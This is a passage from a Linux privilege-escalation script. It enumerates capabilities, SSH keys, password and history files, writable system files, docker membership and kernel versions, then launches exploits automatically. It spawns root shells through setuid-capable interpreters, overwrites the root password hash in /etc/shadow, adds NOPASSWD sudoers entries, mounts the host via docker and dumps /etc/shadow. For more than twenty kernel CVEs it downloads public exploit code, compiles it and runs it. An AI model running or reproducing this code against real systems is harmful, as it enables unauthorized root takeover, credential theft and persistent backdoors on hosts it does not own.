    getcap -r / 2>/dev/null | while read -r line; do
        log "  ${YELLOW}Capability:${NC} $line"
        # Check for dangerous capabilities (only flag if truly dangerous)
        if echo "$line" | grep -q "cap_setuid.*=ep\|cap_setgid.*=ep\|cap_dac_override.*=ep\|cap_sys_admin.*=ep"; then
            critical "Dangerous capability found: $line"
            
            BINARY=$(echo "$line" | awk '{print $1}')
            CAPS=$(echo "$line" | awk '{print $2}')
            
            if echo "$CAPS" | grep -q "cap_setuid"; then
                show_exploit "cap_setuid Capability" \
                    "Binary can set UID. May be exploitable to gain root." \
                    "$BINARY\n# Or check if binary can be exploited to setuid(0)"
                # Try common cap_setuid exploits berdasarkan binary
                _binname=$(basename "$BINARY")
                case "$_binname" in
                    python|python3)
                        run_exploit "cap_setuid $BINARY ->root shell" "$BINARY -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
                        ;;
                    perl)
                        run_exploit "cap_setuid $BINARY ->root shell" "$BINARY -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\";'"
                        ;;
                    ruby)
                        run_exploit "cap_setuid $BINARY ->root shell" "$BINARY -e 'Process::Sys.setuid(0); exec \"/bin/bash\"'"
                        ;;
                    node)
                        run_exploit "cap_setuid $BINARY ->root shell" "$BINARY -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/bash\", {stdio: [0,1,2]})'"
                        ;;
                esac
            fi

            if echo "$CAPS" | grep -q "cap_dac_override"; then
                show_exploit "cap_dac_override Capability" \
                    "Binary can bypass file read/write permissions." \
                    "Use $BINARY to read /etc/shadow or other protected files"
                run_exploit "cap_dac_override ->baca /etc/shadow" "$BINARY /etc/shadow"
            fi
        fi
    done
else
    warning "getcap command not found"
fi

################################################################################
# 7. ENVIRONMENT VARIABLES
################################################################################
progress "Environment Variables"
section "7. ENVIRONMENT VARIABLES"

info "PATH variable: $PATH"
if echo "$PATH" | grep -q "\.\|::"; then
    warning "PATH contains current directory (.) or empty entry (::)"
    show_exploit "PATH Manipulation" \
        "Current directory in PATH allows executing local binaries before system ones." \
        "Create malicious binary:\necho '#!/bin/bash\n/bin/bash' > ./ls\nchmod +x ./ls\n# When root runs commands, your binary executes first"
fi

log ""
info "LD_PRELOAD: ${LD_PRELOAD:-Not set}"
if [ -n "$LD_PRELOAD" ]; then
    warning "LD_PRELOAD is set: $LD_PRELOAD"
    show_exploit "LD_PRELOAD Hijacking" \
        "If sudo allows LD_PRELOAD, can load malicious library." \
        "Create malicious library and use with sudo:\nsudo LD_PRELOAD=/path/to/malicious.so <command>"
fi

info "LD_LIBRARY_PATH: ${LD_LIBRARY_PATH:-Not set}"

log ""
info "All environment variables:"
env | sort | tee -a "$OUTPUT_FILE"

################################################################################
# 8. NETWORK INFORMATION
################################################################################
progress "Network Information"
section "8. NETWORK INFORMATION"

info "Network interfaces:"
ip addr show 2>/dev/null || ifconfig 2>/dev/null | tee -a "$OUTPUT_FILE"

log ""
info "Listening ports:"
netstat -tulpn 2>/dev/null || ss -tulpn 2>/dev/null | tee -a "$OUTPUT_FILE"

log ""
info "Network connections:"
netstat -an 2>/dev/null || ss -an 2>/dev/null | tee -a "$OUTPUT_FILE"

################################################################################
# 9. PROCESSES AND SERVICES
################################################################################
progress "Processes and Services"
section "9. PROCESSES AND SERVICES"

info "Running processes (as root):"
ps aux | grep -E "^root" | head -20 | tee -a "$OUTPUT_FILE"

log ""
info "All processes:"
ps aux | head -30 | tee -a "$OUTPUT_FILE"

log ""
info "Services status:"
if command -v systemctl >/dev/null 2>&1; then
    systemctl list-units --type=service --state=running 2>/dev/null | head -30 | tee -a "$OUTPUT_FILE"
fi

################################################################################
# 10. PASSWORD FILES
################################################################################
progress "Password Files"
section "10. PASSWORD FILES"

info "Checking /etc/passwd:"
if [ -r /etc/passwd ]; then
    cat /etc/passwd | tee -a "$OUTPUT_FILE"
    # Check for users with UID 0
    if grep -q ":0:" /etc/passwd; then
        warning "Users with UID 0 found:"
        grep ":0:" /etc/passwd | tee -a "$OUTPUT_FILE"
    fi
else
    warning "Cannot read /etc/passwd"
fi

log ""
info "Checking /etc/shadow:"
if [ -r /etc/shadow ]; then
    warning "Shadow file is readable!"
    cat /etc/shadow | tee -a "$OUTPUT_FILE"
    show_exploit "Readable /etc/shadow" \
        "Extract password hashes and crack them with John the Ripper or Hashcat." \
        "john /etc/shadow\n# or\nhashcat -m 1800 /etc/shadow /usr/share/wordlists/rockyou.txt"
else
    info "Shadow file not readable (normal)"
fi

log ""
info "Checking for backup password files:"
for file in /etc/passwd- /etc/shadow- /etc/passwd.bak /etc/shadow.bak; do
    if [ -r "$file" ]; then
        warning "Backup password file found: $file"
        head -20 "$file" 2>/dev/null | tee -a "$OUTPUT_FILE"
    fi
done

################################################################################
# 11. SSH KEYS AND CONFIGURATION
################################################################################
progress "SSH Keys"
section "11. SSH KEYS AND CONFIGURATION"

info "SSH authorized_keys:"
if [ -f ~/.ssh/authorized_keys ]; then
    cat ~/.ssh/authorized_keys 2>/dev/null | tee -a "$OUTPUT_FILE"
fi

log ""
info "SSH private keys:"
find ~ -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null | while read -r key; do
    if [ -f "$key" ]; then
        log "  Found: $key"
        ls -la "$key" 2>/dev/null | tee -a "$OUTPUT_FILE"
        show_exploit "SSH Private Key" \
            "Use private key to SSH into the system." \
            "chmod 600 $key\nssh -i $key user@target_host"
    fi
done

log ""
info "SSH configuration:"
if [ -f ~/.ssh/config ]; then
    cat ~/.ssh/config 2>/dev/null | tee -a "$OUTPUT_FILE"
fi

log ""
info "Root SSH keys:"
if [ -f /root/.ssh/authorized_keys ]; then
    warning "Root authorized_keys found!"
    cat /root/.ssh/authorized_keys 2>/dev/null | tee -a "$OUTPUT_FILE"
fi

################################################################################
# 12. HISTORY FILES
################################################################################
progress "History Files"
section "12. HISTORY FILES"

info "Bash history:"
if [ -f ~/.bash_history ]; then
    tail -50 ~/.bash_history 2>/dev/null | tee -a "$OUTPUT_FILE"
    
    # Check for passwords or sensitive info
    if grep -qiE "password|passwd|secret|key|token" ~/.bash_history 2>/dev/null; then
        warning "Potential credentials found in bash history!"
    fi
else
    info "No bash history found"
fi

log ""
info "Other history files:"
for hist in ~/.zsh_history ~/.sh_history ~/.python_history ~/.mysql_history; do
    if [ -f "$hist" ]; then
        log "  Found: $hist"
        tail -20 "$hist" 2>/dev/null | tee -a "$OUTPUT_FILE"
    fi
done

################################################################################
# 13. WRITABLE SYSTEM FILES
################################################################################
progress "Writable System Files"
section "13. WRITABLE SYSTEM FILES"

info "Checking for writable /etc/passwd:"
if [ -w /etc/passwd ]; then
    critical "/etc/passwd is writable!"
    show_exploit "Writable /etc/passwd" \
        "Add new user with root privileges (UID 0)." \
        "echo 'hacker:\$(openssl passwd -1 password):0:0:root:/root:/bin/bash' >> /etc/passwd\nsu hacker"
    run_exploit "Writable /etc/passwd ->tambah root user 'groovy'" "exploit_add_root_user groovy groovy1669"
fi

info "Checking for writable /etc/shadow:"
if [ -w /etc/shadow ]; then
    critical "/etc/shadow is writable!"
    _new_hash=$(openssl passwd -1 'groovy1669' 2>/dev/null || echo 'groovy1669')
    show_exploit "Writable /etc/shadow" \
        "Ganti hash password root." \
        "# Generate hash:\nopenssl passwd -1 newpassword\n# Ganti hash root di /etc/shadow"
    run_exploit "Writable /etc/shadow ->ganti password root ke 'groovy1669'" \
        "sed -i 's|^root:[^:]*:|root:${_new_hash}:|' /etc/shadow && echo '[+] Password root diganti ke: groovy1669' && su root"
fi

info "Checking for writable /etc/sudoers:"
if [ -w /etc/sudoers ]; then
    critical "/etc/sudoers is writable!"
    show_exploit "Writable /etc/sudoers" \
        "Add your user to sudoers with NOPASSWD." \
        "echo '\$(whoami) ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers\nsudo su"
    run_exploit "Writable /etc/sudoers ->NOPASSWD ALL" \
        "echo '$(whoami) ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers && echo '[+] Sudoers updated!' && sudo /bin/bash"
fi

info "Checking for writable /etc/sudoers.d:"
if [ -w /etc/sudoers.d ]; then
    critical "/etc/sudoers.d is writable!"
    show_exploit "Writable /etc/sudoers.d" \
        "Create new sudoers file with full privileges." \
        "echo '\$(whoami) ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/exploit\nsudo su"
    run_exploit "Writable /etc/sudoers.d ->NOPASSWD ALL" \
        "echo '$(whoami) ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/00-groovy-exploit && echo '[+] Sudoers.d updated!' && sudo /bin/bash"
fi

################################################################################
# 14. DOCKER AND CONTAINERS
################################################################################
progress "Docker and Containers"
section "14. DOCKER AND CONTAINERS"

if command -v docker >/dev/null 2>&1; then
    info "Docker version:"
    docker --version 2>/dev/null | tee -a "$OUTPUT_FILE"
    
    log ""
    info "Docker containers:"
    docker ps -a 2>/dev/null | tee -a "$OUTPUT_FILE"
    
    log ""
    info "Docker images:"
    docker images 2>/dev/null | tee -a "$OUTPUT_FILE"
    
    log ""
    info "Checking if user is in docker group:"
    if groups | grep -q docker; then
        critical "User is in docker group - potential container escape!"
        show_exploit "Docker Group Privilege Escalation" \
            "Mount host filesystem and chroot to gain root on host." \
            "docker run -v /:/mnt -it alpine chroot /mnt bash\n# Or:\ndocker run --rm -v /:/mnt -it alpine sh -c 'chroot /mnt bash'"
        run_exploit "Docker group ->host root shell" "docker run -v /:/mnt --rm -it alpine chroot /mnt bash"
    fi
else
    info "Docker not found"
fi

################################################################################
# 15. KERNEL CVE DATABASE — 20+ CVE AUTO-EXPLOIT
################################################################################
progress "Kernel CVE Database"
section "15. KERNEL CVE DATABASE (20+ CVEs)"

KERNEL_VERSION=$(uname -r)
KERNEL_MAJOR=$(echo "$KERNEL_VERSION" | cut -d. -f1)
KERNEL_MINOR=$(echo "$KERNEL_VERSION" | cut -d. -f2)
KPATCH=$(echo "$KERNEL_VERSION" | cut -d. -f3 | cut -d- -f1 | sed 's/[^0-9].*//'); [ -z "$KPATCH" ] && KPATCH=0

info "Kernel : $KERNEL_VERSION  |  Arch: $(uname -m)"
info "Menjalankan pengecekan 20+ CVE kernel..."
log ""

# ── CVE-2010-3904 — RDS socket LPE ──────────────────────────────────────────
# Linux 2.6.30 – 2.6.36
if kver_ge 2 6 30 && kver_le 2 6 36; then
    critical "CVE-2010-3904 (RDS LPE) — Kernel $KERNEL_VERSION rentan!"
    KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT+1)); VULN_CVES+=("CVE-2010-3904")
    show_exploit "CVE-2010-3904 (RDS socket)" "RDS socket privilege escalation" \
        "wget https://www.exploit-db.com/download/15285 -O rds.c\ngcc -o rds rds.c && ./rds"
    kernel_auto_exploit "CVE-2010-3904" \
        "https://www.exploit-db.com/download/15285" \
        "gcc -o rds exp.c" "./rds"
fi

# ── CVE-2012-0056 — Mempodipper ─────────────────────────────────────────────
# Linux 2.6.39 – 3.0.7
if kver_ge 2 6 39 && kver_le 3 0 7; then
    critical "CVE-2012-0056 (Mempodipper) — Kernel $KERNEL_VERSION rentan!"
    KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT+1)); VULN_CVES+=("CVE-2012-0056")
    show_exploit "CVE-2012-0056 (Mempodipper)" "/proc/pid/mem arbitrary write LPE" \
        "wget https://www.exploit-db.com/download/18411 -O mem.c\ngcc -o mem mem.c && ./mem"
    kernel_auto_exploit "CVE-2012-0056" \
        "https://www.exploit-db.com/download/18411" \
        "gcc -o mem exp.c" "./mem"
fi

# ── CVE-2015-1328 — Ubuntu OverlayFS ────────────────────────────────────────
# Ubuntu 12.04-15.10, kernel 3.13-3.19
if kver_ge 3 13 0 && kver_le 3 19 99 && grep -qi ubuntu /etc/os-release 2>/dev/null; then
    critical "CVE-2015-1328 (Ubuntu OverlayFS) — Kernel $KERNEL_VERSION rentan!"
    KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT+1)); VULN_CVES+=("CVE-2015-1328")
    show_exploit "CVE-2015-1328 (Ubuntu OverlayFS)" "Ubuntu overlayfs privilege escalation" \
        "wget https://www.exploit-db.com/download/37292 -O ofs.c\ngcc -o ofs ofs.c && ./ofs"
    kernel_auto_exploit "CVE-2015-1328" \
        "https://www.exploit-db.com/download/37292" \
        "gcc -o ofs exp.c" "./ofs"
fi

# ── CVE-2016-5195 — Dirty COW ────────────────────────────────────────────────
# Linux 2.6.22 – 4.8.2
if kver_ge 2 6 22 && kver_le 4 8 2; then
    critical "CVE-2016-5195 (Dirty COW) — Kernel $KERNEL_VERSION rentan!"
    KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT+1)); VULN_CVES+=("CVE-2016-5195")
    show_exploit "CVE-2016-5195 (Dirty COW)" \
        "Race condition in copy-on-write. Modifikasi /etc/passwd untuk root." \
        "git clone https://github.com/FireFart/dirtycow\ncd dirtycow && gcc -pthread dirty.c -o dirty -lcrypt && ./dirty"
    kernel_auto_exploit "CVE-2016-5195" \
        "https://github.com/FireFart/dirtycow" \
        "gcc -pthread dirty.c -o dirty -lcrypt" "./dirty"
fi

# ── CVE-2016-8655 — chocobo_root (AF_PACKET) ─────────────────────────────────
# Linux 3.2 – 4.4.1
if kver_ge 3 2 0 && kver_le 4 4 1; then
    critical "CVE-2016-8655 (chocobo_root) — Kernel $KERNEL_VERSION rentan!"
    KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT+1)); VULN_CVES+=("CVE-2016-8655")
    show_exploit "CVE-2016-8655 (AF_PACKET race)" "AF_PACKET race condition LPE" \
        "wget https://www.exploit-db.com/download/40871 -O choco.c\ngcc -o choco choco.c && ./choco"
    kernel_auto_exploit "CVE-2016-8655" \
        "https://www.exploit-db.com/download/40871" \
        "gcc -o choco exp.c" "./choco"
fi

# ── CVE-2017-6074 — DCCP double-free ─────────────────────────────────────────
# Linux < 4.9.11
if kver_le 4 9 10; then
    critical "CVE-2017-6074 (DCCP double-free) — Kernel $KERNEL_VERSION rentan!"
    KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT+1)); VULN_CVES+=("CVE-2017-6074")
    show_exploit "CVE-2017-6074 (DCCP)" "DCCP socket double-free use-after-free" \
        "wget https://www.exploit-db.com/download/41458 -O dccp.c\ngcc -o dccp dccp.c && ./dccp"
    kernel_auto_exploit "CVE-2017-6074" \
        "https://www.exploit-db.com/download/41458" \
        "gcc -o dccp exp.c" "./dccp"
fi

# ── CVE-2017-7308 — AF_PACKET setsockopt ─────────────────────────────────────
# Linux < 4.10.6
if kver_le 4 10 5; then
    critical "CVE-2017-7308 (AF_PACKET setsockopt) — Kernel $KERNEL_VERSION rentan!"
    KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT+1)); VULN_CVES+=("CVE-2017-7308")
    show_exploit "CVE-2017-7308" "AF_PACKET ring buffer heap overflow" \
        "git clone https://github.com/xairy/kernel-exploits\ncd kernel-exploits/CVE-2017-7308 && make && ./pwn"
    kernel_auto_exploit "CVE-2017-7308" \
        "https://github.com/xairy/kernel-exploits" \
        "[ -d CVE-2017-7308 ] && cd CVE-2017-7308; make 2>/dev/null || gcc -o pwn exploit.c" "./pwn"
fi

# ── CVE-2017-16995 — eBPF verifier ───────────────────────────────────────────
# Linux 4.4 – 4.14
if kver_ge 4 4 0 && kver_le 4 14 0; then
    critical "CVE-2017-16995 (eBPF verifier) — Kernel $KERNEL_VERSION rentan!"
    KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT+1)); VULN_CVES+=("CVE-2017-16995")
    show_exploit "CVE-2017-16995 (eBPF)" "eBPF integer overflow verifier bypass" \
        "wget https://www.exploit-db.com/download/45010 -O ebpf.c\ngcc -o ebpf ebpf.c && ./ebpf"
    kernel_auto_exploit "CVE-2017-16995" \
        "https://www.exploit-db.com/download/45010" \
        "gcc -o ebpf exp.c" "./ebpf"
fi

# ── CVE-2017-1000112 — UFO scatter-gather ────────────────────────────────────
# Linux < 4.13
if kver_le 4 12 99; then
    critical "CVE-2017-1000112 (UFO scatter-gather) — Kernel $KERNEL_VERSION rentan!"
    KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT+1)); VULN_CVES+=("CVE-2017-1000112")
    show_exploit "CVE-2017-1000112" "UFO to non-UFO socket buffer path exploit" \
        "git clone https://github.com/xairy/kernel-exploits\ncd kernel-exploits/CVE-2017-1000112 && make && ./pwn"
    kernel_auto_exploit "CVE-2017-1000112" \
        "https://github.com/xairy/kernel-exploits" \
        "[ -d CVE-2017-1000112 ] && cd CVE-2017-1000112; make 2>/dev/null || gcc -o pwn exploit.c" "./pwn"
fi

# ── CVE-2019-13272 — PTRACE_TRACEME ─────────────────────────────────────────
# Linux 4.10 – 5.1.17
if kver_ge 4 10 0 && kver_le 5 1 17; then
    critical "CVE-2019-13272 (PTRACE_TRACEME) — Kernel $KERNEL_VERSION rentan!"
    KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT+1)); VULN_CVES+=("CVE-2019-13272")
    show_exploit "CVE-2019-13272" "ptrace_link parent credential abuse" \
        "git clone https://github.com/bcoles/kernel-exploits\ncd kernel-exploits/CVE-2019-13272 && bash compile.sh && ./exploit"
    kernel_auto_exploit "CVE-2019-13272" \
        "https://github.com/bcoles/kernel-exploits" \
        "[ -d CVE-2019-13272 ] && cd CVE-2019-13272; bash compile.sh 2>/dev/null || gcc -o exploit exploit.c" "./exploit"
fi

# ── CVE-2021-3493 — Ubuntu OverlayFS (20.04) ─────────────────────────────────
# Ubuntu 20.04, kernel 5.4-5.10 (sebelum 5.11.0-17)
if kver_ge 5 4 0 && kver_le 5 11 16 && grep -qi ubuntu /etc/os-release 2>/dev/null; then
    critical "CVE-2021-3493 (Ubuntu OverlayFS 20.04) — Kernel $KERNEL_VERSION rentan!"
    KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT+1)); VULN_CVES+=("CVE-2021-3493")
    show_exploit "CVE-2021-3493" "Ubuntu-specific OverlayFS xattr setuid LPE" \
        "git clone https://github.com/briskets/CVE-2021-3493\ncd CVE-2021-3493 && gcc -o exploit exploit.c && ./exploit"
    kernel_auto_exploit "CVE-2021-3493" \
        "https://github.com/briskets/CVE-2021-3493" \
        "gcc -o exploit exploit.c" "./exploit"
fi

# ── CVE-2021-22555 — Netfilter heap overflow ─────────────────────────────────
# Linux 2.6 – 5.11 (butuh nf_tables / iptables loaded)
if kver_ge 2 6 0 && kver_le 5 11 99; then
    if lsmod 2>/dev/null | grep -qE "nf_tables|iptable" || [ -d /proc/net/netfilter ]; then
        critical "CVE-2021-22555 (Netfilter heap overflow) — Kernel $KERNEL_VERSION rentan!"
        KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT+1)); VULN_CVES+=("CVE-2021-22555")
        show_exploit "CVE-2021-22555" "Netfilter xt_compat_target_from_user heap overflow" \
            "wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c\ngcc -o exploit exploit.c -lpthread && ./exploit"
        kernel_auto_exploit "CVE-2021-22555" \
            "https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c" \
            "gcc -o exploit exp.c -lpthread" "./exploit"
    fi
fi

# ── CVE-2022-0185 — fsconfig heap overflow ───────────────────────────────────
# Linux 5.1 – 5.16.1
if kver_ge 5 1 0 && kver_le 5 16 1; then
    critical "CVE-2022-0185 (fsconfig heap overflow) — Kernel $KERNEL_VERSION rentan!"
    KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT+1)); VULN_CVES+=("CVE-2022-0185")
    show_exploit "CVE-2022-0185" "Heap overflow in filesystem context (user ns)" \
        "git clone https://github.com/Crusaders-of-Rust/CVE-2022-0185\ncd CVE-2022-0185 && make && ./exploit"
    kernel_auto_exploit "CVE-2022-0185" \
        "https://github.com/Crusaders-of-Rust/CVE-2022-0185" \
        "make 2>/dev/null || gcc -o exploit exploit.c" "./exploit"
fi

# ── CVE-2022-0847 — DirtyPipe ────────────────────────────────────────────────
# Linux 5.8-5.9, 5.11-5.14, 5.16.0-11, 5.10.102, 5.15.25, 5.17.0
_dpipe=0
if [ "$KERNEL_MAJOR" -eq 5 ]; then
    case "$KERNEL_MINOR" in
        8|9|11|12|13|14) _dpipe=1 ;;
        10) [ "$KPATCH" -eq 102 ] && _dpipe=1 ;;
        15) [ "$KPATCH" -eq 25 ] && _dpipe=1 ;;
        16) [ "$KPATCH" -ge 1 ] && [ "$KPATCH" -le 11 ] && _dpipe=1 ;;
        17) [ "$KPATCH" -eq 0 ] && _dpipe=1 ;;
    esac
fi
if [ "$_dpipe" -eq 1 ]; then
    critical "CVE-2022-0847 (DirtyPipe) — Kernel $KERNEL_VERSION rentan!"
    KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT+1)); VULN_CVES+=("CVE-2022-0847")
    show_exploit "CVE-2022-0847 (DirtyPipe)" \
        "Uninitialized pipe var allows overwriting arbitrary read-only files." \
        "git clone https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit\ncd CVE-2022-0847-DirtyPipe-Exploit && make && ./exploit"
    kernel_auto_exploit "CVE-2022-0847" \
        "https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit" \
        "make 2>/dev/null || gcc -o exploit exploit.c" "./exploit"
fi

# ── CVE-2022-25636 — nf_tables OOB write ─────────────────────────────────────
# Linux 5.4 – 5.16.5
if kver_ge 5 4 0 && kver_le 5 16 5; then
    if lsmod 2>/dev/null | grep -q nf_tables; then
        critical "CVE-2022-25636 (nf_tables OOB) — Kernel $KERNEL_VERSION rentan!"
        KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT+1)); VULN_CVES+=("CVE-2022-25636")
        show_exploit "CVE-2022-25636" "nf_tables nft_fwd_dup_netdev_offload OOB write" \
            "git clone https://github.com/Bonfee/CVE-2022-25636\ncd CVE-2022-25636 && make && ./exploit"
        kernel_auto_exploit "CVE-2022-25636" \
            "https://github.com/Bonfee/CVE-2022-25636" \
            "make 2>/dev/null || gcc -o exploit exploit.c" "./exploit"
    fi
fi

# ── CVE-2022-2588 — nft_object UAF ───────────────────────────────────────────
# Linux 5.4 – 5.19
if kver_ge 5 4 0 && kver_le 5 19 99; then
    if lsmod 2>/dev/null | grep -q nf_tables; then
        critical "CVE-2022-2588 (nft_object UAF) — Kernel $KERNEL_VERSION rentan!"
        KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT+1)); VULN_CVES+=("CVE-2022-2588")
        show_exploit "CVE-2022-2588" "nft_object use-after-free via route chain" \
            "git clone https://github.com/Markakd/CVE-2022-2588\ncd CVE-2022-2588 && make && ./exp_file_credential"
        kernel_auto_exploit "CVE-2022-2588" \
            "https://github.com/Markakd/CVE-2022-2588" \
            "make 2>/dev/null || gcc -o exp_file_credential exp_file_credential.c" "./exp_file_credential"
    fi
fi

# ── CVE-2022-32250 — nftables LPE ────────────────────────────────────────────
# Linux 5.4 – 5.18.1
if kver_ge 5 4 0 && kver_le 5 18 1; then
    if lsmod 2>/dev/null | grep -q nf_tables; then
        critical "CVE-2022-32250 (nftables UAF) — Kernel $KERNEL_VERSION rentan!"
        KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT+1)); VULN_CVES+=("CVE-2022-32250")
        show_exploit "CVE-2022-32250" "nftables nft_expr_ops use-after-free" \
            "git clone https://github.com/theori-io/CVE-2022-32250-exploit\ncd CVE-2022-32250-exploit && make && ./exploit"
        kernel_auto_exploit "CVE-2022-32250" \
            "https://github.com/theori-io/CVE-2022-32250-exploit" \
            "make 2>/dev/null || gcc -o exploit exploit.c -lpthread" "./exploit"
    fi
fi

# ── CVE-2023-0386 — OverlayFS FUSE setuid ────────────────────────────────────
# Linux 5.11 – 6.2
if kver_ge 5 11 0 && kver_le 6 2 99; then
    critical "CVE-2023-0386 (OverlayFS setuid) — Kernel $KERNEL_VERSION rentan!"
    KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT+1)); VULN_CVES+=("CVE-2023-0386")
    show_exploit "CVE-2023-0386" "OverlayFS fuse setuid copy privilege escalation" \
        "git clone https://github.com/sxlmnwb/CVE-2023-0386\ncd CVE-2023-0386 && make all\n./fuse ./ovlcap/lower ./gc & sleep 1 && ./exp"
    kernel_auto_exploit "CVE-2023-0386" \
        "https://github.com/sxlmnwb/CVE-2023-0386" \
        "make all 2>/dev/null" "( ./fuse ./ovlcap/lower ./gc & ); sleep 1; ./exp"
fi

# ── CVE-2023-2640 / CVE-2023-27163 — Ubuntu OverlayFS "GameOver" ─────────────
# Ubuntu 22.04 + kernel 5.15.x (ubuntu patched)
if kver_ge 5 15 0 && kver_le 5 15 99 && grep -qi "ubuntu 22" /etc/os-release 2>/dev/null; then
    critical "CVE-2023-2640/CVE-2023-27163 (Ubuntu GameOver) — Kernel $KERNEL_VERSION rentan!"
    KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT+1)); VULN_CVES+=("CVE-2023-2640")
    show_exploit "CVE-2023-2640 (Ubuntu GameOver)" \
        "Ubuntu-specific overlayfs setxattr LPE. One-liner." \
        'unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3; mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c '"'"'import os;os.setuid(0);os.system("bash")'"'"
    if [ "$EXPLOIT_MODE" -eq 1 ]; then
        echo -ne "${CYAN}[AUTO-EXPLOIT] CVE-2023-2640 one-liner? [y/N]: ${NC}"
        read -r -t 30 _go 2>/dev/null || _go="n"
        if [ "$_go" = "y" ] || [ "$_go" = "Y" ]; then
            _godir=$(mktemp -d /tmp/gameover_XXXXX)
            mkdir -p "$_godir"/{l,u,w,m}
            cp /usr/bin/python3 "$_godir/l/" 2>/dev/null
            unshare -rm sh -c "cd $_godir; setcap cap_setuid+eip l/python3 2>/dev/null; mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/python3" 2>/dev/null
            "$_godir/u/python3" -c 'import os; os.setuid(0); os.system("/bin/bash")' 2>/dev/null || echo "[-] Gagal."
        fi
    fi
fi

# ── CVE-2023-32233 — nftables anon set UAF ───────────────────────────────────
# Linux < 6.3.1
if kver_le 6 3 0; then
    if lsmod 2>/dev/null | grep -q nf_tables; then
        critical "CVE-2023-32233 (nftables anon UAF) — Kernel $KERNEL_VERSION rentan!"
        KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT+1)); VULN_CVES+=("CVE-2023-32233")
        show_exploit "CVE-2023-32233" "nftables anonymous set use-after-free via batch requests" \
            "git clone https://github.com/Liuk3r/CVE-2023-32233\ncd CVE-2023-32233 && gcc -Wall -o exploit exploit.c -lmnl -lnftnl && ./exploit"
        kernel_auto_exploit "CVE-2023-32233" \
            "https://github.com/Liuk3r/CVE-2023-32233" \
            "gcc -Wall -o exploit exploit.c -lmnl -lnftnl 2>/dev/null || gcc -o exploit exploit.c" "./exploit"
    fi
fi

# ── CVE-2024-1086 — nf_tables verdict UAF ────────────────────────────────────
# Linux 5.14 – 6.6.14
if kver_ge 5 14 0 && kver_le 6 6 14; then
    if lsmod 2>/dev/null | grep -q nf_tables; then
        critical "CVE-2024-1086 (nf_tables UAF) — Kernel $KERNEL_VERSION rentan!"
        KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT+1)); VULN_CVES+=("CVE-2024-1086")
        show_exploit "CVE-2024-1086" "nf_tables verdict init use-after-free" \
            "git clone https://github.com/notselwyn/CVE-2024-1086\ncd CVE-2024-1086 && make && ./exploit"
        kernel_auto_exploit "CVE-2024-1086" \
            "https://github.com/notselwyn/CVE-2024-1086" \
            "make 2>/dev/null || gcc -o exploit exploit.c" "./exploit"
    fi
fi

# ── CVE-2022-0492 — cgroup v1 release_agent escape ───────────────────────────
# Linux < 5.17 — container/host escape jika cgroup v1 tersedia
if kver_le 5 16 99; then
    if mount 2>/dev/null | grep -q "cgroup" || [ -d /sys/fs/cgroup ]; then
        critical "CVE-2022-0492 (cgroup v1 release_agent) — Kernel $KERNEL_VERSION rentan!"
        KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT+1)); VULN_CVES+=("CVE-2022-0492")
        show_exploit "CVE-2022-0492 (cgroup v1)" \
            "Container escape / LPE via cgroup v1 release_agent write." \
            'mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp\nmkdir /tmp/cgrp/x\necho 1 > /tmp/cgrp/x/notify_on_release\necho "$(sed -n '"'"'s/.*\perdir=\([^,]*\).*/\1/p'"'"' /etc/mtab)/cmd" > /tmp/cgrp/release_agent\necho '"'"'#!/bin/sh\nid > /tmp/output\nchmod 777 /tmp/output'"'"' > /cmd\nchmod +x /cmd\nsh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"\ncat /tmp/output'
        kernel_auto_exploit "CVE-2022-0492" \
            "https://github.com/SofianeHamlaoui/CVE-2022-0492-CHECKER" \
            "chmod +x *.sh 2>/dev/null; ls" \
            "bash *.sh 2>/dev/null || echo '[*] coba: mkdir /tmp/cg && mount -t cgroup -o memory cgroup /tmp/cg'"
    fi
fi

# ── CVE-2021-4034 — PwnKit (polkit pkexec) ───────────────────────────────────
# polkit 0.105-26 sampai 0.120-1 (hampir semua distro sebelum Jan 2022)
_pwnkit=0
if command -v pkexec >/dev/null 2>&1; then
    _pkexec_path=$(command -v pkexec)
    if [ -u "$_pkexec_path" ] 2>/dev/null; then
        _pwnkit=1
    fi
    if command -v pkcheck >/dev/null 2>&1; then
        _pv=$(pkcheck --version 2>/dev/null | grep -oP 'polkit \K[0-9.]+' || echo "0.105")
        _pm=$(echo "$_pv" | cut -d. -f2)
